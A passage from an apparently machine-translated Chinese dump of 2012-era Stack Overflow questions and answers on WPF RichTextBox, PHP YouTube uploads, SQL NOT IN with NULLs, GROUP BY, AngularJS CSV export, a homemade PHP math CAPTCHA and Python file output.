    <Grid.ColumnDefinitions>
        <ColumnDefinition />
        <ColumnDefinition />
    </Grid.ColumnDefinitions>

    <Grid.RowDefinitions>
        <RowDefinition />
        <RowDefinition Height="Auto" />
    </Grid.RowDefinitions> 
```

包装 RTB 并在代码中使用

```
 FlowDocument doc = RTB1.Document;
    RTB1.Document = new FlowDocument();
    RTB2.Document = doc; 
```

我不知道这是否会拆分控件，但我们可以在另一个 RTB 中看到文档（单个）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-08T09:21:18.290

要在另一个 RichTextBox 中获取超出高度限制的内容，我将使用以下方法：

```
 private TextRange GetTopRange()
    {
        var result = textBox.GetPositionFromPoint(new Point(0, 0), true);
        if (result == null)
            return null;
        result = result.GetInsertionPosition(LogicalDirection.Forward);
        return new TextRange(result.DocumentStart, result);
    }

    private TextRange GetBottomRange()
    {
        var result = textBox.GetPositionFromPoint(new Point(textBox.ActualWidth, textBox.ActualHeight), true);
        if (result == null)
            return null;
        result = result.GetInsertionPosition(LogicalDirection.Backward);
        return new TextRange(result, result.DocumentEnd);
    } 
```

有了文本范围，您可以将它们复制到另一个 RichTextBox 的新 FlowDocument 中，截断它们 ( `range.Text = string.Empty`) 等。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-01-22T20:54:53.487

```
public void CreateNewRtb(object sender, RoutedEventArgs routedEventArgs)
{
  var res = (ResourceDictionary)Application.LoadComponent(new Uri("/Design/Style/TextAreaStyle.xaml", UriKind.Relative));
  var mcRtb = new RichTextBox {Style = (Style) res["TextBoxStyle"], Name = "Folha" + J};
  RegisterName("Folha" + J, mcRtb);
  mcRtb.TextChanged += McRtbContentControl;
  var gcrd = new RowDefinition();
  var gcrdspace = new RowDefinition();
  gcrd.Height = new GridLength(980);
  GridControl.RowDefinitions.Add(gcrd);
  Grid.SetColumn(mcRtb, 1);
  Grid.SetRow(mcRtb, 1 + I);
  GridControl.Children.Add(mcRtb);
  I += 2;
  J++;
  gcrdspace.Height = new GridLength(30);
  GridControl.RowDefinitions.Add(gcrdspace);
  mcRtb.Focus();
} 
```

这是控制新月网格大小和随意创建 rtb 的简单方法：D**

# php - 使用youtube api直接上传后如何重定向

> ID：13167805
> 
> 赞同：0
> 
> 时间：2012-10-31T21:36:46.300
> 
> 标签：php, zend-framework, youtube-api

我正在尝试使用 youtube api for PHP 将视频从服务器直接上传到 youtube。上传代码在控制器中，如下所示 function uploadVideo() { require_once 'Zend/Loader.php';

```
 Zend_Loader::loadClass('Zend_Gdata_YouTube');
    $yt = new Zend_Gdata_YouTube();
    Zend_Loader::loadClass('Zend_Gdata_AuthSub');
    Zend_Loader::loadClass('Zend_Gdata_ClientLogin');
    //client login
    $authenticationURL = 'https://www.google.com/accounts/ClientLogin';
    $httpClient = Zend_Gdata_ClientLogin::getHttpClient($username = 'myusername@gmail.com', $password = 'password', $service = 'youtube', $client = null, $source = 'videotest',$loginToken = null, $loginCaptcha = null, $authenticationURL);
    $developerKey = 'my-key';
    $yt = new Zend_Gdata_YouTube($httpClient, "videotest",null,$developerKey);

    $myVideoEntry = new Zend_Gdata_YouTube_VideoEntry();

    // create a new Zend_Gdata_App_MediaFileSource object
     $path = Configure::read('Files.write');
     $video = $path . DS . 'videos' . DS .'car.mp4';
    $filesource = $yt -> newMediaFileSource($video);
    $filesource -> setContentType('video/mp4');

    $filesource -> setSlug($video);

    // add the filesource to the video entry
    $myVideoEntry -> setMediaSource($filesource);

    $myVideoEntry -> setVideoTitle('car');
    $myVideoEntry -> setVideoDescription('car video');
    // The category must be a valid YouTube category!
    $myVideoEntry -> setVideoCategory('Autos');

    $myVideoEntry -> SetVideoTags('cars, test');

    $myVideoEntry -> setVideoDeveloperTags(array('mydevtag', 'anotherdevtag'));

    $myVideoEntry->setVideoPrivate();

    // upload URI for the currently authenticated user
    $uploadUrl = "http://uploads.gdata.youtube.com/feeds/api/users/default/uploads";

    try {
        $newEntry = $yt -> insertEntry($myVideoEntry, $uploadUrl, 'Zend_Gdata_YouTube_VideoEntry');
echo "returned from youtube";
$this -> redirect('/videos/view');

    } catch (Zend_Gdata_App_HttpException $httpException) {
        //print_r($httpException);
        echo $httpException -> getRawResponseBody();
    } catch (Zend_Gdata_App_Exception $e) {
        print_r($e);
        echo $e -> getMessage();
    }

} 
```

视频被上传到我的 youtube 频道，但在上传后我只看到一个空白屏幕并且它没有被重定向。事实上它在 insertentry 后没有执行任何语句。这里有什么遗漏吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T12:39:11.180

如果您想通过 HTML 表单提交视频，然后在完成后自动重定向到另一个页面，您应该使用[基于浏览器的上传流程。](https://developers.google.com/youtube/2.0/developers_guide_php#Browser_based_Upload)

如果您坚持使用直接上传流程，那么我不确定您的问题的答案是什么，因为它与 YouTube API 没有直接关系。它只是归结为“在进行一些任意 PHP 调用后，我如何重定向到新网页”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T05:25:11.550

我深入研究了这个问题，发现问题出在 zend/gdata/app.php 的方法 insertentry 中。由于某些原因

```
 $returnEntry = new $className($response->getBody()); 
```

失败，即使`$response->getBody()`是非空的。所以现在，我注释掉了 post() 之后的代码，并从此方法返回 null。它工作正常，控件返回到我的应用程序。我不确定这是一个错误还是缺少某些东西。如果有人能指出发生了什么问题，那就太好了。谢谢。

# mysql - MySQL 数据库结构，用于存储具有不同属性的不同类型的对象

> ID：13167806
> 
> 赞同：1
> 
> 时间：2012-10-31T21:36:54.077
> 
> 标签：mysql, types, entity-attribute-value

我想创建 MySQL 数据库结构来合并以下情况：

我需要将具有不同属性（名称、数量和大小）的不同类型的对象组存储在同一个数据表中，避免使用 EAV 数据模型。这个数据库模型必须易于扩展、搜索、索引...

对象示例：

*   汽车（制造商、名称、年份、颜色、重量、高度、发动机类型……）
*   电视机（制造商、名称、类型、对角线...）
*   宠物（品种、年龄、颜色...）...

这可能吗？

# facebook-like - 我的域上的“喜欢”按钮

> ID：13167807
> 
> 赞同：-2
> 
> 时间：2012-10-31T21:36:57.977
> 
> 标签：facebook-like, account

我想在我自己的域上的商店中安装类似按钮。我并没有真正得到线索，喜欢按钮的作用。因为我在 facebook 上也有一个帐户：如果有人喜欢我的域名，这是否也会被计入我的 faceboo 网站，或者这两个不同的东西。如果是，我可以合并吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:39:36.797

如果您在商店中放置了“赞”按钮。它会“喜欢”这家商店并将其发布到喜欢它的人的 Facebook 上。一般没有修改。认为人们喜欢我在我的域上的 Facebook 网站，认为他们喜欢我的域。

# angularjs - angularjs csv 下载到本地

> ID：13167808
> 
> 赞同：2
> 
> 时间：2012-10-31T21:37:07.750
> 
> 标签：angularjs

如果用户单击按钮，当我使用 $http Get with Angular 调用服务时，我让服务端返回 csv 格式。

```
So the return is like 1,2,3,4,5,6,7,8,9,10 
```

为用户提供将其保存在本地计算机的最佳方式是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-18T02:36:25.350

有两种选择

1) 从您的服务器发送 csv。

2) 数据 URI。我想这就是你所要求的。这是一个例子

```
/**
 * @param{string} content The contents of a file to download.
 * @param{string} fileName The name to save the file as on the user's computer.
 */
function(content, fileName) {
  var dataUrl = 'data:text/csv;utf-9,' + encodeURI(content);
  var link = document.createElement('a');
  angular.element(link)
    .attr('href', dataUrl)
    .attr('download', fileName) // Pretty much only works in chrome
  link.click();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-16T09:26:36.473

你可以试试[Alasql](http://github.com/agershun/alasql)库，它可以将数据以 CSV 格式保存一行：

```
 function myCtrl($scope) {
    $scope.filename = "mydata.csv";
    $scope.cities = [{city:"Odessa",population:100000},
                  {city:"Voronezh",population:201022},
                  {city: "Paris", population: 3000000}];

    $scope.saveCSV = function(filename, content) {
          alasql('SELECT city, population INTO CSV("'+$scope.filename+'",{headers:true}) FROM ?',
           [$scope.cities]);
    };
 }; 
```

请参阅jsFiddle 中[的完整示例代码](http://jsfiddle.net/tmsoobot/1/)。

在此示例中，Alasql 使用 SELECT 运算符从数据数组中选择所需的字段（AngularJS' 创建 $$hashKey 字段，用户可能不需要该字段）。如果您不使用这些数据，只需导出到 CSV 文件：

```
alasql('SELECT * INTO CSV('mydata.csv') FROM ?',[$scope.data]); 
```

# visual-studio-2010 - 无法在 VS2010 build devenv myProject.sln /build "DeBug" /useenv 上包含环境变量

> ID：13167819
> 
> 赞同：1
> 
> 时间：2012-10-31T21:37:58.090
> 
> 标签：visual-studio-2010, devenv

为了在 VS2010 项目构建中包含环境变量，我在 VS2010 命令提示符中运行它

```
devenv myProject.sln /build "DeBug" /useenv 
```

并得到错误

```
Invalid Command Line. Unknown Switch : useenv 
```

我看不出哪里出错了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-20T07:32:08.233

导航到安装 Visual Studio 的路径。在我的本地是：C:\Program Files (x86)\Microsoft Visual Studio 10.0\

转到 Common7\IDE 目录：C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE 并在此处打开控制台。

现在，在命令提示符下运行以下命令：devenv -h

它将列出 devenv.exe 的所有可用参数和开关。在输出的底部，应该有以下内容：

产品专用开关：

```
/debugexe Open the specified executable to be debugged. The
    remainder of the command line is passed to this
            executable as its arguments.

/useenv Use PATH, INCLUDE, LIBPATH, and LIB environment variables
            instead of IDE paths for VC++ builds. 
```

我假设你会得到更短的列表，没有 /useenv 选项，比如：

产品专用开关：

```
/debugexe       Open the specified executable to be debugged. The
    remainder of the command line is passed to this
            executable as its arguments. 
```

这就是为什么您总是收到“无效的命令行。未知开关：useenv”错误消息的原因。

我有同样的问题，并做了以下解决它：

1.  如果您安装了 .NET framework 4.5，请将其卸载。
2.  卸载 Visual Studio 2010
3.  在再次安装 Visual Studio 2010 之前安装 .NET Framework 4.0（不要安装 .NET 4.5）
4.  安装 Visaul Studio 2010。
5.  现在您可以安装 .NET 4.5

我没有足够的时间进行调查并解释“为什么”。但是这些步骤解决了这个问题。

# php - 如何将上传的文件名更改为序列号名称不是随机的

> ID：13167821
> 
> 赞同：0
> 
> 时间：2012-10-31T21:38:16.110
> 
> 标签：php, file, upload

我的网站上有一个上传器，它在最后用（“原始名称”+“随机数”）一个随机数重命名图像文件。

我想让上传的文件按顺序排列，以便必须最近上传的图片位于自动填充页面的顶部。

现在代码有随机数生成器，然后它采用原始文件名并将其放在开头..

我只希望所有图片都像 10.jpg 那样读取，然后上传的下一张照片是 9.jpg 和 8.jpg

自动填充功能我现在将最小的数字放在页面上

如何才能做到这一点。我担心的是，当下一个人上传时，它会覆盖上一个“起始”点 10.jpg 文件吗？

您可以在此处查看 php 文件`http://ilovesmallies.com/forum/processupload.php`

```
 // Random number for both file, will be added after image name
    $RandomNumber   = rand(0, 9999999999); 

//Get file extension from Image name, this will be re-added after random name
    $ImageExt = substr($ImageName, strrpos($ImageName, '.'));
    $ImageExt = str_replace('.','',$ImageExt); 
```

**编辑：所有文件都上传到目录文件夹。我在单独的页面上使用此代码将它们绘制到 div 中。然后自动填充该页面上的缩略图。**

```
<script>
$.ajax({
  url: "user-uploads-thumbnails",
  success: function(data){
     $(data).find("a:contains(.jpg)").each(function(){
        // will loop through 
var images = 'user-uploads-thumbnails/' + $(this).attr("href");
var linkimage = 'user-uploads/' + $(this).attr("href");
 //backup $('<p><a href="' + linkimage + '"><img src="' + images + '"></a></p>').appendTo('#content');
$('<p><a class="fancybox" href="' + linkimage + '" data-fancybox-group="gallery"><img src="' + images + '"></a></p>').appendTo('#content');
     });
  }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T23:24:04.330

这是一种非常简单的方法。前提是没有两个人同时上传....

您将需要创建一个目录，其中包含：

*   索引.php
*   anotherpage.php // 这个名字无关紧要（这只是为了抓取最近的图像
*   /上传
*   计数.txt
*   公司.php

索引.php

```
<?php

    include("inc.php");
    if(isset($_FILES["file"])){
        $new_filename = read_file($counter_file); // fetch the number for filename
        $new_filename++; // increment the counter
        move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $new_filename.".jpg"); // assumes jpg (easily extended to other formats)
        write_to_file($new_filename,$counter_file);

        echo "<img src=\"upload/".$new_filename.".jpg\" /><br />";
    }

?>

<form id="upload" action="index.php" enctype="multipart/form-data" method="post"> 
    <input type="file" name="file" id="file" /> <br />
    <input type="submit" value="go" />  
</form> 
```

另一个页面.php

```
<?php

    include("inc.php");

    $new_filename = read_file($counter_file);
    echo "<img src=\"upload/".$new_filename.".jpg\" /><br />";

?> 
```

公司.php

```
<?php

        $counter_file = "count.txt"; // name of the file containing your file count

        function write_to_file($text,$filename){
            $fp = fopen($filename, 'w');
            fwrite($fp, $text);
            fclose($fp);
        }

        function read_file($filename){
        $handle = fopen($filename, "r");
        $contents = fread($handle, filesize($filename));
        fclose($handle);
        return($contents);
        }

?> 
```

警告：这不包含验证。请记住，文件的 mime 类型可以被伪造。这是针对您的问题的简单有效解决方案。

# linq - IList 查询根据另一个 IList 对象修改一个对象 - 例如 sql 中的 distinct

> ID：13167824
> 
> 赞同：1
> 
> 时间：2012-10-31T21:38:37.107
> 
> 标签：linq, ilist

我正在尝试编写一些可以区分列表的东西，如果在不同的列表中找到多个设置属性。例如关于某事发生了多少次的计数器，可能还有最后一次发生的日期。这就是我到目前为止所拥有的。

```
foreach(DataObject srcObj in ilSource){
    if (ilDest.All(x => x.Property1 != srcObj.Property1 || x.srcObj != srcObj.Property2))
        ilDest.Add(srcObj);
    else
        DataObject newObject = ilDest.SingleOrDefault(x => x.Property1 == srcObj.Property1 && x.Property2 == srcObj.Property2);
        newObject.Propert3++;
        newObject.Property4 = srcObj.Property5;
} 
```

一旦发生下一次迭代，newObject 属性就不会保留，因为对象没有在集合中重新设置。如果没有 Linq，我只需手动遍历集合，抓取对象并进行更改并继续下一个，因为我拥有该对象的真实副本。

提前感谢您提供的任何帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T03:02:18.850

这是我对您所问问题的最佳解释。

试试这个：

```
var query =
    from srcObj in ilSource
    orderby srcObj.Property5
    group srcObj by new
    {
        srcObj.Property1,
        srcObj.Property2,
    } into gs
    select new
    {
        First = gs.First(),
        Last = gs.Last(),
        Count = gs.Count(),
    };

foreach (var x in query)
{
    x.First.Property3 = x.Count;
    x.First.Property4 = x.Last.Property5;
}

var ilDest = query
    .Select(x => x.First)
    .ToList(); 
```

现有对象的修改需要一个`foreach`循环，因为 LINQ 是关于查询而不是更新。

尽管如此，我“修复”了您的代码并使我的答案产生了相同的结果。您的固定代码应如下所示：

```
foreach(DataObject srcObj in ilSource)
{
    if (ilDest.All(x =>
            x.Property1 != srcObj.Property1 || x.Property2 != srcObj.Property2))
        ilDest.Add(srcObj);
    else
    {
        DataObject newObject = ilDest.SingleOrDefault(x =>
            x.Property1 == srcObj.Property1 && x.Property2 == srcObj.Property2);
        newObject.Property3++;
        newObject.Property4 = srcObj.Property5;
    }
} 
```

# c# - C# 与数据库服务器应用程序不使用数据集

> ID：13167825
> 
> 赞同：-1
> 
> 时间：2012-10-31T21:38:39.390
> 
> 标签：c#, database, datatable, dataset

有没有办法在任何数据库服务器上使用 C# 创建应用程序，但不使用 DataSets、DataTables、DataAdapters 等？（在这种情况下，也没有使用 DataGridView）

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-31T21:40:53.283

您可以使用 ADO.Net EntityFramework 来处理没有数据集的数据库。或者您可以使用任何其他 ORM。

# coldfusion - 如何克隆 ORM 实体并使用克隆的属性创建新记录？

> ID：13167826
> 
> 赞同：3
> 
> 时间：2012-10-31T21:38:44.410
> 
> 标签：coldfusion

原因是，有超过 100 列我想重用，只有 4 列将被更改，然后作为新记录插入。我最后的手段是加载我想克隆的实体，然后手动设置新实体的属性和加载的实体。

我尝试了以下方法。

```
<!--- load entity I would like to clone -->
<cfset mainObj= EntityLoad("myBean",{fkOtherId = 2},true)>
<!--- create new entity to save -->
<cfset newObj = EntityNew( "myBean" )>
<!--- clone entity -->
<cfset newObj = EntityMerge(mainObj)>
<cfset newObj.setFirstName(‘John’)>
<cfset newObj.setLastName(‘Smith’)>
<cfset entitySave(newObj)> 
```

已解决：使用

```
<cfset newObj = duplicate(mainObj)>
<cfset newObj.setId(‘’)>
<cfset newObj.setFirstName(‘John’)>
<cfset newObj.setLastName(‘Smith’)>
<cfset entitySave(newObj, true)> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:57:16.097

entitySave 有第二个参数，称为 forceInsert。这应该在这里工作。

```
<cfset entitySave( newObj, true )> 
```

# php - 自制验证码，安全吗？

> ID：13167832
> 
> 赞同：3
> 
> 时间：2012-10-31T21:39:26.657
> 
> 标签：php, security, captcha, brute-force

我一直在收集有关如何保护日志页面免受*暴力攻击或**创建多个帐户的骚扰的信息。*

我得出结论（感谢 Stackoverflow 的你们），最好的方法是使用验证码。

但难以阅读的验证码或重音字符可能会阻止用户使用网站。

所以，我发现了一个易于使用的小脚本，我适应了我的网站。这是一个简单的数学验证码，建议将 2 个数字从*0 到 10*相加。它显示单词**“一”、“二”、“三”** ……而不是数字。

我的问题是：

1）这个小验证码本身是否提供足够的安全性？

2）我集成它的方式安全吗？（有什么办法绕过它？）

*为了避免粘贴800行代码我做了一个总结，希望清楚。*

**验证码脚本：**

```
$n1  = mt_rand(0,10);  
$n2  = mt_rand(0,10);  
$fig = array('zero','one','two','three','four','five','six','seven','eight','nine','ten');  
$result = $n1 + $n2;
$sentence = $fig[$n1] .' plus '.$fig[$n2];  
$_SESSION['captcha'] = $result;  
$captcha_label = "<label for='captcha' >How much does ".$sentence."make?</label>";               
echo $captcha_label."</label><input  type='text' name='captcha'  value=''/><br />";                                 
echo "<input type='submit' name='create' value='create account'>"; 
```

**页数：**

*   **表格.php：**

所有*“创建帐户”*输入字段 + 验证码

=> 测试

*   **测试.php：**

    `if($_POST['captcha'] != $_SESSION['captcha']){
    $_SESSION['captcha_control'] = "false";` }

然后所有*'create account'* $_POSTS 都经过注入测试

如果其中任何一个或验证码返回 "false" ，则脚本将转向 => question.php

*   **问题.php：**

与突出显示所有“错误字段”的初始表单相呼应，并显示新的验证码，是对还是错。
验证 => 回到**test.php**

非常感谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-31T21:43:11.337

像大多数简单的验证码一样，它会运行得相当好，直到您的网站足够重要，垃圾邮件发送者会花几分钟时间弄清楚如何破解它。那时，您将被垃圾邮件淹没。

如果您打算使用自己的 CAPTCHA，这太过分了——它甚至不需要是随机的。简单地要求用户输入一个恒定的词（例如，“在此框中输入‘橙色’”）将阻止绝大多数简单的垃圾邮件程序。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-31T21:50:39.480

我认为黄昏回答了你关于验证码质量的问题。至于问题标题中所问的是否“安全”，您尚未定义该术语，但可能没有。

```
$_SESSION['captcha'] = $result; 
```

在您确定是否与合法用户打交道之前，可能会分配一个服务器端会话。这会使您面临 DOS 攻击，因为攻击者只需要在会话超时窗口内创建大量唯一会话即可占用您服务器上的存储空间。由于您依赖于默默无闻，将答案存储在隐藏变量中（并将所有输入放在`<form>`标签中）也可以做到这一点，而不会占用服务器端资源。

# sql - 为什么在此选择查询中未选择任何内容？

> ID：13167837
> 
> 赞同：1
> 
> 时间：2012-10-31T21:39:45.563
> 
> 标签：sql, sql-server-2008-r2

如果我跑

```
Select distinct CompanyID from Device 
```

我得到6行。如果我跑

```
Select CompanyID from Company 
```

我得到 8441 行。如果我运行以下命令：

如果我跑

```
Select CompanyID
from Company where CompanyID NOT IN 
( 
   Select distinct CompanyID from Device
) 
```

我应该得到不在原始选择语句中的 8435 公司，对吗？

但是，当我运行它时，我得到 0 行。这里有什么问题？上面的 6 个结果之一为空，但这无关紧要。

谢谢！

编辑：在 Marc-s 的帮助下，我能够得到以下语句是我需要的，我仍然觉得这个查询中有一个额外的步骤，有人愿意添加吗？

```
DELETE from Company where CompanyID NOT IN
(
Select C.CompanyID 
from Company C where C.CompanyID IN 
( 
  Select distinct CompanyID from Device
)
OR CompanyID IN
(
  Select distinct CustomerID from Device
)
OR CompanyID IN
(
  Select distinct CompanyID from AssignedCompanies
 )
 ) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T21:42:44.510

不，输出是正确的。

您有 8441 行`Company`- 它们的`CompanyID`值只是您从第一个查询中获得的 6 行之一（比如说`A`, `B`, `C`, `D`, `E`, `F`）。

**所有**行都有`CompanyID`来自这 6 个不同值的值。

因此，当您在最后一个查询中进行选择时，您希望获取所有行的值**不是**您在第一个查询中获得的这六个值中的任何一个 - 但**所有**行都具有**这 6 个值**中的一个（`A`通过`F`）`CompanyId`！

所以你什么也得不到——因为它们的所有`CompanyId`值**都存在**于该子选择中，因此被排除在`SELECT`语句之外

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:50:15.583

假设 Company 中的 CompanyID 不在 Device 中，则问题是来自 Device 的 6 中的 NULL 值。即使 CompanyID 不是 6 个之一，您的 NOT IN 语句也会评估为 UNKNOWN。有关更多详细信息，请参阅此 Q/A：[NOT IN 子句和 NULL 值](https://stackoverflow.com/questions/129077/sql-not-in-constraint-and-null-values)

编辑：为避免这种情况，请尝试将您的子查询更改为：

```
SELECT DISTINCT CompanyID FROM  Device WHERE CompanyID IS NOT NULL 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-31T21:43:01.640

结果是正确的。

如果您的`device`表包含表中的所有相同值，`company`则选择所有`DISTINCT`CompanyID 的查询将包括其他表中的所有 CompanyID：

例子：

```
CREATE TABLE device ([companyid] int);

INSERT INTO device  ([companyid])
VALUES
    (1),
    (1),
    (2),
    (3),
    (4),
    (5),
    (6),
    (7),
    (7)
;

CREATE TABLE company([companyid] int, [name] varchar(5));

INSERT INTO company ([companyid], [name])
VALUES
    (1, 'Comp1'),
    (2, 'Comp2'),
    (3, 'Comp3'),
    (4, 'Comp4'),
    (5, 'Comp5'),
    (6, 'Comp6'),
    (7, 'Comp7')
; 
```

您的查询将返回以下`DISTINCT`值 - 1、2、3、4、5、6、7。您的`company`表包含相同的值，因此`NOT IN`将返回零记录：

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/a72ff/1)

现在假设您的`device`表没有保存表的所有值`company`，那么您将返回任何缺失值

```
CREATE TABLE device([companyid] int);

INSERT INTO device([companyid])
VALUES
    (1),
    (1),
    (2),
    (3),
    (4)
;

CREATE TABLE company([companyid] int, [name] varchar(5));

INSERT INTO company([companyid], [name])
VALUES
    (1, 'Comp1'),
    (2, 'Comp2'),
    (3, 'Comp3'),
    (4, 'Comp4'),
    (5, 'Comp5'),
    (6, 'Comp6'),
    (7, 'Comp7')
; 
```

然后此查询将返回值 5、6、7，因为虽然它们存在于`company`表中，但它们不在`device`表中：

```
Select CompanyID
from Company 
where CompanyID NOT IN (Select distinct CompanyID 
                        from Device) 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/3aaee/1)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T21:42:59.060

嵌套选择中有所有不同的 CompanyID。因此，您不会找到该集合中不存在的 CompanyID 的任何行。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-31T21:44:45.210

查询可能是正确的，但您假设数据中没有重叠。

例如，如果 Device 表的 CompanyID 值为 1、2、3、4、5，而 Company 表的值为 1、2、3、4、5、6、7，那么您的查询将产生 0 行。

如果您将查询从 NOT IN 反转为 IN，它应该向您显示相交值。

# sql - SQL、分组依据、合并字符串

> ID：13167845
> 
> 赞同：0
> 
> 时间：2012-10-31T21:40:31.177
> 
> 标签：sql, group-by

我有这张桌子：

```
name    count1    count2   address
John      5         0      London
John      0         3      London
Phil      1         0      Paris 
```

我想得到

```
name    count1    count2   address
John      5         3      London
Phil      1         0      Paris 
```

所以我想求和 count1 和 sum count2 并按名称分组但合并地址（因为每个名称的地址总是相同的）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:44:41.277

您需要按姓名和地址分组：

```
SELECT name, address, sum(count1), sum(count2)
FROM table
GROUP BY name, address 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:45:11.540

所以你想按姓名**和**地址分组：

```
select name, sum(count1)as count1, sum(count2)as count2, address
from dbo.table
group by name, address; 
```

基本上是`GROUP BY` *合并*记录。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-31T21:50:30.407

使用以下查询。您如何包含地址实际上取决于您使用的数据库。

```
select name, sum(count1) count1,sum(count2) count2 ,address
from table1
group by name, address 
```

[SQLFiddle 玩](http://sqlfiddle.com/#!2/f432c/3/0)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T21:44:10.637

这是 SQL 聚合 101（我还在学习，顺便说一句）：

```
select name, sum(count1), sum(count2), address
from mytable
group by name, address; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-31T22:09:33.400

如果您不喜欢按解决方案进行双重分组，您也可以使用 select inside from：

```
select distinct temp.name, temp.count1, temp.count2, t.address
from mytable t, (select t2.name, sum(t2.count1) as count1, sum(t2.count2) as count2
                 from mytable t2
                 group by t2.name) as temp
where t.name = temp.name 
```

# c# - 简单的电子邮件消息预览器

> ID：13167849
> 
> 赞同：0
> 
> 时间：2012-10-31T21:40:49.880
> 
> 标签：c#

我正在尝试开发一种有助于训练 Spamassassin 的实用程序。我在顶部填充了主题、发件人等的列表视图，底部有两个预览/查看窗格、一个文本框和一个邮件查看器。如果它们是垃圾邮件或火腿邮件，我会标记它们。所以我必须先见他们。

我可以轻松地在文本框中显示消息源。但是我无法成功显示丰富的邮件消息。我尝试了浏览器控件，它显示了一些消息非常好，并且没有显示 - 显示为消息源 - 大多数。

我完全不知道如何显示邮件消息。是否有任何特殊的组件/控件？我可以使用 Win7 的内置预览功能吗？或者我可以在我自己的实用程序上使用 Explorer 的预览机制吗？抱歉，目前我无法添加任何代码，因为该问题与任何代码行都不相关。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T22:01:09.103

问题是您的电子邮件嵌入了难以显示的附件。您可以编写一些代码来解决这个问题，但它很耗时，而且可能效果不如您所愿。

几年前我遇到了一些类似的问题。我当时使用了类似的东西[http://forums.asp.net/t/1350519.aspx](http://forums.asp.net/t/1350519.aspx)

更新：需要在 PC 上安装 Outlook。使用 Outlook Express 可以完成类似的操作，您只需要找到 COM dll。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T22:59:38.180

我使用来自[https://github.com/andyedinborough/aenetmail的](https://github.com/andyedinborough/aenetmail)**AE.Net.Mail**并进行了一些测试，效果非常好！

重温代码：

```
 string htmlBody = "", textBody = "";

            MailMessage msg = new MailMessage();
            msg.Load(cellBody.Value.ToString(), false); // cellBody.Value.ToString() is raw message

            if (msg.Body != null)
            {
                switch (msg.ContentType)
                {
                    case "text/plain":
                        textBody = msg.Body;
                        break;
                    case "text/html":
                        htmlBody = msg.Body;
                        break;
                }
            }

            if(msg.AlternateViews.Count > 0)
            {
                foreach (Attachment alternateView in msg.AlternateViews)
                {

                    switch (alternateView.ContentType)
                    {
                        case "text/plain":
                            textBody = alternateView.Body;
                            break;
                        case "text/html":
                            htmlBody = alternateView.Body;
                            break;
                    }
                }
            }

            if(msg.Attachments.Count > 0)
            {
                foreach (Attachment attachment in msg.Attachments)
                {

                    switch (attachment.ContentType)
                    {
                        case "text/plain":
                            textBody = attachment.Body;
                            break;
                        case "text/html":
                            htmlBody = attachment.Body;
                            break;
                        case "message/rfc822":
                            break;
                    }
                }
            }

            textBody = "<pre>" + textBody + "</pre>";

            if (htmlBody == "")
                webBrowser1.DocumentText = textBody;
            else
                webBrowser1.DocumentText = htmlBody;

            textBox1.Text = cellBody.Value.ToString(); 
```

# python - 将打印语句写入文本文件

> ID：13167852
> 
> 赞同：1
> 
> 时间：2012-10-31T21:41:21.087
> 
> 标签：python, text-files, glob

我正在尝试将所有带有 *.txt 的文件打印到文本文件中，该文件夹如下所示

\文件夹 file1.txt file2.txt file3.csv

我的 python 代码如下所示：

```
import glob
for text in glob.glob('*.txt'):
    print text

file=open('output.txt', 'w')
file.write(text)
file.close() 
```

运行此程序后，我进入空闲窗口 file1.txt file2.txt 但我的 output.txt 只有 file2.txt 写入其中。

我认为这将是获得结果的快速方法，有没有办法可以将“文本”全部强制输出文件？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-31T21:44:02.100

实际上，您将整个值放入`text`输出文件中；`text`只是不是你想的那样。

唯一`text`被分配到的地方是在`for text in glob.glob('*.txt')`循环中。在循环之后，它将保留为分配给它的*最后一个*值，即`'file2.txt'`.

有几种方法可以实现您想要做的事情。如果您从命令行而不是 IDLE 运行脚本，则可以执行类似（在 Unix 中）

```
python my_script.py | tee output.txt 
```

将脚本中的所有输出复制到文件`output.txt`中，而无需在 Python 代码中执行任何操作，除了普通`print`的 s。

您也可以直接将其写出来，而不是按照[Lattyware](https://stackoverflow.com/a/13167904/344821)`print`的建议进行调用，但除非您手动执行两者，否则这不会同时执行。

为了使这更容易一点，您可以编写一个函数来调用，而不是`print`更方便地进行这两种操作。就像是：

```
with open('output.txt', 'w') as f:
    def my_print(str):
        print str
        f.write(str + '\n')

    for filename in glob.glob('*.txt'):
        my_print(filename) 
```

如果你真的想使用`print`语句，你也可以做一些更花哨的事情： reassign [`sys.stdout`](http://docs.python.org/2/library/sys.html#sys.stdout)，从 Python 执行所有打印的特殊对象。这可能比你需要的更复杂，但如果你想看到它，我会告诉你。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-31T21:45:31.510
